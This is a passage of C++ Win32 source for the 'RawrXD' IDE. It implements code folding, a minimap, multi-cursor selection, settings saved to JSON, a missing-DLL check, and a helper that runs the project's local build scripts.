        (L"[Editor] Column selected: Lines " + std::to_wstring(startLine + 1) + 
         L"-" + std::to_wstring(endLine + 1) + L", Columns " + 
         std::to_wstring(startCol + 1) + L"-" + std::to_wstring(endCol + 1) + L"\r\n").c_str());
}

// Code folding functions
void InitializeCodeFolding() {
    if (!g_hwndEditor) return;
    
    g_foldingRegions.clear();
    
    // Analyze the current text for foldable regions
    int lineCount = (int)SendMessage(g_hwndEditor, EM_GETLINECOUNT, 0, 0);
    
    for (int i = 0; i < lineCount; i++) {
        int lineLen = (int)SendMessage(g_hwndEditor, EM_LINELENGTH, 
                                       SendMessage(g_hwndEditor, EM_LINEINDEX, i, 0), 0);
        if (lineLen > 0) {
            wchar_t* lineText = new wchar_t[lineLen + 1];
            lineText[0] = lineLen;
            SendMessage(g_hwndEditor, EM_GETLINE, i, (LPARAM)lineText);
            lineText[lineLen] = L'\0';
            
            std::wstring line(lineText);
            delete[] lineText;
            
            // Simple folding logic: look for opening braces
            if (line.find(L'{') != std::wstring::npos) {
                // Find matching closing brace
                int openBraces = 1;
                int endLine = i + 1;
                
                while (endLine < lineCount && openBraces > 0) {
                    int endLineLen = (int)SendMessage(g_hwndEditor, EM_LINELENGTH, 
                                                      SendMessage(g_hwndEditor, EM_LINEINDEX, endLine, 0), 0);
                    if (endLineLen > 0) {
                        wchar_t* endLineText = new wchar_t[endLineLen + 1];
                        endLineText[0] = endLineLen;
                        SendMessage(g_hwndEditor, EM_GETLINE, endLine, (LPARAM)endLineText);
                        endLineText[endLineLen] = L'\0';
                        
                        std::wstring endLineStr(endLineText);
                        delete[] endLineText;
                        
                        for (wchar_t c : endLineStr) {
                            if (c == L'{') openBraces++;
                            else if (c == L'}') openBraces--;
                        }
                    }
                    endLine++;
                }
                
                if (openBraces == 0 && endLine - i > 2) { // Only fold if more than 2 lines
                    FoldingRegion region;
                    region.startLine = i;
                    region.endLine = endLine - 1;
                    region.isCollapsed = false;
                    region.preview = line.substr(0, std::min(50, (int)line.length())) + L"...";
                    g_foldingRegions.push_back(region);
                }
            }
        }
    }
    
    AppendWindowText(g_hwndOutput, 
        (L"[Editor] Code folding initialized. Found " + 
         std::to_wstring(g_foldingRegions.size()) + L" foldable regions.\r\n").c_str());
}

void ToggleFoldingRegion(int regionIndex) {
    if (regionIndex < 0 || regionIndex >= (int)g_foldingRegions.size()) return;
    
    auto& region = g_foldingRegions[regionIndex];
    region.isCollapsed = !region.isCollapsed;
    
    if (region.isCollapsed) {
        AppendWindowText(g_hwndOutput, 
            (L"[Editor] Collapsed region: lines " + std::to_wstring(region.startLine + 1) + 
             L"-" + std::to_wstring(region.endLine + 1) + L"\r\n").c_str());
    } else {
        AppendWindowText(g_hwndOutput, 
            (L"[Editor] Expanded region: lines " + std::to_wstring(region.startLine + 1) + 
             L"-" + std::to_wstring(region.endLine + 1) + L"\r\n").c_str());
    }
    
    // In a full implementation, this would hide/show the folded lines in the editor
}

void ToggleAllFolding() {
    if (g_foldingRegions.empty()) {
        InitializeCodeFolding();
        return;
    }
    
    bool allCollapsed = true;
    for (const auto& region : g_foldingRegions) {
        if (!region.isCollapsed) {
            allCollapsed = false;
            break;
        }
    }
    
    // Toggle all regions
    for (auto& region : g_foldingRegions) {
        region.isCollapsed = !allCollapsed;
    }
    
    AppendWindowText(g_hwndOutput, 
        (allCollapsed ? L"[Editor] Expanded all folding regions.\r\n" 
                      : L"[Editor] Collapsed all folding regions.\r\n"));
}

// Minimap implementation
void CreateMinimap() {
    if (!g_hwndMain || g_hwndMinimap) return;
    
    RECT clientRect;
    GetClientRect(g_hwndMain, &clientRect);
    
    g_hwndMinimap = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        L"STATIC",
        L"",
        WS_CHILD | WS_VISIBLE | SS_BLACKRECT,
        clientRect.right - g_minimapWidth, 0,
        g_minimapWidth, clientRect.bottom - 40, // 40 for status bar
        g_hwndMain,
        (HMENU)IDC_MINIMAP,
        GetModuleHandle(nullptr),
        nullptr
    );
    
    AppendWindowText(g_hwndOutput, L"[Editor] Minimap created.\r\n");
}

void UpdateMinimap() {
    if (!g_hwndMinimap || !g_hwndEditor) return;
    
    // Get editor content
    int textLen = GetWindowTextLength(g_hwndEditor);
    if (textLen == 0) return;
    
    std::wstring content(textLen + 1, L'\0');
    GetWindowText(g_hwndEditor, &content[0], textLen + 1);
    content.resize(textLen);
    
    // Create a minimap bitmap representation
    RECT minimapRect;
    GetClientRect(g_hwndMinimap, &minimapRect);
    
    HDC hdcMinimap = GetDC(g_hwndMinimap);
    HDC hdcMem = CreateCompatibleDC(hdcMinimap);
    
    if (g_minimapBitmap) DeleteObject(g_minimapBitmap);
    g_minimapBitmap = CreateCompatibleBitmap(hdcMinimap, minimapRect.right, minimapRect.bottom);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, g_minimapBitmap);
    
    // Fill background
    HBRUSH hBrush = CreateSolidBrush(RGB(30, 30, 30));
    FillRect(hdcMem, &minimapRect, hBrush);
    DeleteObject(hBrush);
    
    // Simple minimap: each line as a colored pixel row
    SetTextColor(hdcMem, RGB(200, 200, 200));
    HFONT hFont = CreateFont(2, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                             ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
    HFONT hOldFont = (HFONT)SelectObject(hdcMem, hFont);
    
    // Draw simplified content
    int yPos = 0;
    size_t pos = 0;
    while (pos < content.length() && yPos < minimapRect.bottom) {
        size_t lineEnd = content.find(L'\n', pos);
        if (lineEnd == std::wstring::npos) lineEnd = content.length();
        
        std::wstring line = content.substr(pos, lineEnd - pos);
        if (!line.empty()) {
            // Draw a colored rectangle representing code density
            int codeChars = 0;
            for (wchar_t c : line) {
                if (c != L' ' && c != L'\t') codeChars++;
            }
            
            if (codeChars > 0) {
                int intensity = std::min(255, codeChars * 8);
                HBRUSH hLineBrush = CreateSolidBrush(RGB(intensity / 3, intensity / 2, intensity));
                RECT lineRect = {0, yPos, minimapRect.right, yPos + 2};
                FillRect(hdcMem, &lineRect, hLineBrush);
                DeleteObject(hLineBrush);
            }
        }
        
        yPos += 2;
        pos = lineEnd + 1;
    }
    
    SelectObject(hdcMem, hOldFont);
    DeleteObject(hFont);
    SelectObject(hdcMem, hOldBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(g_hwndMinimap, hdcMinimap);
    
    InvalidateRect(g_hwndMinimap, nullptr, FALSE);
}

void ToggleMinimap() {
    if (g_hwndMinimap) {
        g_minimapVisible = !g_minimapVisible;
        ShowWindow(g_hwndMinimap, g_minimapVisible ? SW_SHOW : SW_HIDE);
        
        // Resize editor to accommodate minimap
        RECT clientRect;
        GetClientRect(g_hwndMain, &clientRect);
        
        if (g_hwndEditor) {
            int editorWidth = g_minimapVisible ? 
                clientRect.right - g_minimapWidth - 200 : // 200 for file tree
                clientRect.right - 200;
                
            SetWindowPos(g_hwndEditor, nullptr, 200, 0, 
                         editorWidth, clientRect.bottom - 200, // 200 for bottom panels
                         SWP_NOZORDER);
        }
        
        AppendWindowText(g_hwndOutput, 
            g_minimapVisible ? L"[Editor] Minimap shown.\r\n" 
                             : L"[Editor] Minimap hidden.\r\n");
    } else {
        CreateMinimap();
        g_minimapVisible = true;
    }
}

// Advanced selection functions
void SelectAllOccurrences() {
    if (!g_hwndEditor) return;
    
    // Get current selection
    DWORD selection = (DWORD)SendMessage(g_hwndEditor, EM_GETSEL, 0, 0);
    int start = LOWORD(selection);
    int end = HIWORD(selection);
    
    if (start == end) return; // No selection
    
    // Get selected text
    int textLen = GetWindowTextLength(g_hwndEditor);
    std::wstring content(textLen + 1, L'\0');
    GetWindowText(g_hwndEditor, &content[0], textLen + 1);
    content.resize(textLen);
    
    std::wstring selectedText = content.substr(start, end - start);
    if (selectedText.empty()) return;
    
    // Find all occurrences and add multi-cursors
    g_multiCursors.clear();
    g_multiCursorMode = true;
    
    size_t pos = 0;
    int occurrenceCount = 0;
    while ((pos = content.find(selectedText, pos)) != std::wstring::npos) {
        // Convert position to line/column
        int line = 0;
        int lineStart = 0;
        for (int i = 0; i < (int)pos; i++) {
            if (content[i] == L'\n') {
                line++;
                lineStart = i + 1;
            }
        }
        int column = (int)pos - lineStart;
        
        AddCursorAtPosition(line, column);
        pos += selectedText.length();
        occurrenceCount++;
    }
    
    AppendWindowText(g_hwndOutput, 
        (L"[Editor] Selected " + std::to_wstring(occurrenceCount) + 
         L" occurrences of '" + selectedText + L"'\r\n").c_str());
}

// ============================================================================
// Settings System Implementation
// ============================================================================

std::wstring GetSettingsFilePath() {
    if (g_settingsFilePath.empty()) {
        wchar_t appDataPath[MAX_PATH];
        if (SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath) == S_OK) {
            g_settingsFilePath = std::wstring(appDataPath) + L"\\RawrXD\\settings.json";
            
            // Ensure directory exists
            std::wstring dirPath = std::wstring(appDataPath) + L"\\RawrXD";
            CreateDirectoryW(dirPath.c_str(), nullptr);
        } else {
            // Fallback to current directory
            g_settingsFilePath = L"settings.json";
        }
    }
    return g_settingsFilePath;
}

void ApplySettings() {
    // Apply theme
    if (!g_themes.empty()) {
        for (size_t i = 0; i < g_themes.size(); i++) {
            if (g_themes[i].name == g_settings.theme) {
                g_currentTheme = (int)i;
                break;
            }
        }
        
        const Theme& theme = g_themes[g_currentTheme];
        g_settings.backgroundColor = theme.background;
        g_settings.textColor = theme.text;
        g_settings.selectionColor = theme.selection;
        g_settings.lineNumberColor = theme.lineNumber;
        g_settings.terminalBgColor = theme.terminalBg;
        g_settings.terminalTextColor = theme.terminalText;
    }
    
    // Apply editor settings
    if (g_hwndEditor) {
        // Set font
        if (g_hFontCode) DeleteObject(g_hFontCode);
        g_hFontCode = CreateFontW(
            -MulDiv(g_settings.fontSize, GetDeviceCaps(GetDC(g_hwndEditor), LOGPIXELSY), 72),
            0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, FIXED_PITCH | FF_MODERN,
            g_settings.fontFamily.c_str()
        );
        SendMessage(g_hwndEditor, WM_SETFONT, (WPARAM)g_hFontCode, TRUE);
        
        // Set colors (for RichEdit, this would involve setting character formats)
        SendMessage(g_hwndEditor, EM_SETBKGNDCOLOR, 0, g_settings.backgroundColor);
    }
    
    // Apply terminal settings
    if (g_hwndTerminal) {
        SendMessage(g_hwndTerminal, EM_SETBKGNDCOLOR, 0, g_settings.terminalBgColor);
    }
    
    // Apply panel visibility
    g_bFileTreeVisible = g_settings.fileTreeVisible;
    g_bOutputVisible = g_settings.outputVisible;
    g_bTerminalVisible = g_settings.terminalVisible;
    g_bChatVisible = g_settings.chatVisible;
    g_bIssuesVisible = g_settings.issuesVisible;
    
    // Apply feature enablement
    g_minimapVisible = g_settings.minimapEnabled;
    g_codeFoldingEnabled = g_settings.codeFoldingEnabled;
    
    if (g_hwndMain) {
        UpdateLayout(g_hwndMain);
        InvalidateRect(g_hwndMain, nullptr, TRUE);
    }
    
    AppendWindowText(g_hwndOutput, L"[Settings] Applied settings successfully.\r\n");
}

void SaveSettings() {
    std::wstring filePath = GetSettingsFilePath();
    
    // Build JSON string
    std::string json = "{\n";
    json += "  \"fontFamily\": \"" + std::string(g_settings.fontFamily.begin(), g_settings.fontFamily.end()) + "\",\n";
    json += "  \"fontSize\": " + std::to_string(g_settings.fontSize) + ",\n";
    json += "  \"theme\": \"" + std::string(g_settings.theme.begin(), g_settings.theme.end()) + "\"\n";
    json += "}\n";
    
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(hFile, json.c_str(), (DWORD)json.length(), &bytesWritten, nullptr);
        CloseHandle(hFile);
        AppendWindowText(g_hwndOutput, L"[Settings] Settings saved successfully.\r\n");
    } else {
        AppendWindowText(g_hwndOutput, L"[Settings] Failed to save settings.\r\n");
    }
}

// ============================================================================
// Phase 1: Critical Fixes Implementation
// ============================================================================

void ApplyCriticalFixes() {
    AppendWindowText(g_hwndOutput, L"[System] Applying critical fixes...\r\n");
    
    // Fix 1: Terminal colors - ensure proper contrast
    g_settings.terminalBgColor = RGB(20, 20, 20);     // Dark but not black
    g_settings.terminalTextColor = RGB(200, 255, 100); // Bright green
    
    // Apply terminal color fix immediately
    if (g_hwndTerminal) {
        SendMessage(g_hwndTerminal, EM_SETBKGNDCOLOR, 0, g_settings.terminalBgColor);
        
        // Set text color using character formatting
        CHARFORMAT2W cf;
        ZeroMemory(&cf, sizeof(cf));
        cf.cbSize = sizeof(cf);
        cf.dwMask = CFM_COLOR;
        cf.crTextColor = g_settings.terminalTextColor;
        SendMessage(g_hwndTerminal, EM_SETCHARFORMAT, SCF_ALL, (LPARAM)&cf);
        
        AppendWindowText(g_hwndOutput, L"[Fix] Terminal colors updated to bright green on dark background.\r\n");
    }
    
    // Fix 2: Ensure all panels are visible by default
    g_bFileTreeVisible = true;
    g_bOutputVisible = true;
    g_bTerminalVisible = true;  // CRITICAL: Make terminal visible
    g_bChatVisible = true;
    g_bIssuesVisible = true;
    
    // Fix 3: Load settings and apply them
    LoadSettings();
    ApplySettings();
    
    // Fix 4: Show user which DLLs are missing
    CheckMissingDLLs();
    
    // Fix 5: Start the AI inference worker thread
    StartInferenceThread();
    
    AppendWindowText(g_hwndOutput, L"[System] Critical fixes applied successfully.\r\n");
}

void CheckMissingDLLs() {
    std::vector<std::wstring> missingDlls;
    
    // Check for critical DLLs
    HMODULE hTitanTest = LoadLibraryW(L"RawrXD_Titan_Kernel.dll");
    if (!hTitanTest) {
        missingDlls.push_back(L"RawrXD_Titan_Kernel.dll");
    } else {
        FreeLibrary(hTitanTest);
    }
    
    HMODULE hBridgeTest = LoadLibraryW(L"RawrXD_NativeModelBridge.dll");
    if (!hBridgeTest) {
        missingDlls.push_back(L"RawrXD_NativeModelBridge.dll");
    } else {
        FreeLibrary(hBridgeTest);
    }
    
    if (!missingDlls.empty()) {
        AppendWindowText(g_hwndOutput, L"[System] CRITICAL: Missing DLLs detected:\r\n");
        for (const auto& dll : missingDlls) {
            AppendWindowText(g_hwndOutput, L"  - ");
            AppendWindowText(g_hwndOutput, dll.c_str());
            AppendWindowText(g_hwndOutput, L"\r\n");
        }
        AppendWindowText(g_hwndOutput, L"[System] AI features will be limited. Run build scripts to compile missing DLLs.\r\n");
        
        // Show user-friendly dialog
        std::wstring message = L"The following critical components are missing:\\n\\n";
        for (const auto& dll : missingDlls) {
            message += L"• " + dll + L"\\n";
        }
        message += L"\\nAI features will be limited until these are compiled.\\n";
        message += L"Check the Output panel for details.";
        
        MessageBoxW(g_hwndMain, message.c_str(), L"RawrXD - Missing Components", 
                    MB_OK | MB_ICONWARNING);
    } else {
        AppendWindowText(g_hwndOutput, L"[System] All critical DLLs are available.\r\n");
    }
}

void CompileMissingDLLs() {
    AppendWindowText(g_hwndOutput, L"[Build] Attempting to compile missing DLLs...\r\n");
    
    // Check if build scripts exist
    std::vector<std::wstring> buildScripts = {
        L"build_titan_engine.bat",
        L"build_titan_kernel.bat", 
        L"build_native_bridge.bat"
    };
    
    for (const auto& script : buildScripts) {
        if (GetFileAttributesW(script.c_str()) != INVALID_FILE_ATTRIBUTES) {
            AppendWindowText(g_hwndOutput, L"[Build] Found build script: ");
            AppendWindowText(g_hwndOutput, script.c_str());
            AppendWindowText(g_hwndOutput, L"\r\n");
            
            // Execute build script
            STARTUPINFOW si = {};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi = {};
            
            std::wstring cmdLine = L"cmd.exe /c " + script;
            std::vector<wchar_t> cmdBuf(cmdLine.begin(), cmdLine.end());
            cmdBuf.push_back(0);
            
            if (CreateProcessW(nullptr, cmdBuf.data(), nullptr, nullptr, FALSE, 
                              CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
                
                AppendWindowText(g_hwndOutput, L"[Build] Executing: ");
                AppendWindowText(g_hwndOutput, script.c_str());
                AppendWindowText(g_hwndOutput, L"\r\n");
                
                // Wait for completion (with timeout)
                DWORD waitResult = WaitForSingleObject(pi.hProcess, 30000); // 30 seconds
                
                if (waitResult == WAIT_OBJECT_0) {
                    DWORD exitCode = 0;
                    GetExitCodeProcess(pi.hProcess, &exitCode);
                    
                    if (exitCode == 0) {
                        AppendWindowText(g_hwndOutput, L"[Build] Success: ");
                        AppendWindowText(g_hwndOutput, script.c_str());
                        AppendWindowText(g_hwndOutput, L"\r\n");
                    } else {
                        AppendWindowText(g_hwndOutput, L"[Build] Failed: ");
                        AppendWindowText(g_hwndOutput, script.c_str());
                        AppendWindowText(g_hwndOutput, L" (exit code ");
                        AppendWindowText(g_hwndOutput, std::to_wstring(exitCode).c_str());
                        AppendWindowText(g_hwndOutput, L")\r\n");
                    }
                } else {
                    AppendWindowText(g_hwndOutput, L"[Build] Timeout: ");
                    AppendWindowText(g_hwndOutput, script.c_str());
                    AppendWindowText(g_hwndOutput, L"\r\n");
                    TerminateProcess(pi.hProcess, 1);
                }
                
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                AppendWindowText(g_hwndOutput, L"[Build] Failed to start: ");
                AppendWindowText(g_hwndOutput, script.c_str());
                AppendWindowText(g_hwndOutput, L"\r\n");
            }
        }
    }
    
    // Re-check for missing DLLs
    AppendWindowText(g_hwndOutput, L"[Build] Re-checking for missing components...\r\n");
    CheckMissingDLLs();
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow) {
    g_hInstance = hInstance;

    LoadLibraryW(L"Msftedit.dll");

    INITCOMMONCONTROLSEX icc = {};
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_WIN95_CLASSES | ICC_LISTVIEW_CLASSES | ICC_TAB_CLASSES;
    InitCommonControlsEx(&icc);

    WNDCLASSEXW wc = {};
    wc.cbSize = sizeof(wc);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"RawrXDMainWindow";
    if (!RegisterClassExW(&wc)) {
        return 0;
    }

    g_hwndMain = CreateWindowExW(
        0,
        wc.lpszClassName,
        L"RawrXD IDE",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 1200, 800,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );

    if (!g_hwndMain) {
        return 0;
    }

    ShowWindow(g_hwndMain, nCmdShow);
    UpdateWindow(g_hwndMain);

    MSG msg = {};
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR, int nCmdShow) {
    return wWinMain(hInstance, hPrevInstance, GetCommandLineW(), nCmdShow);
}
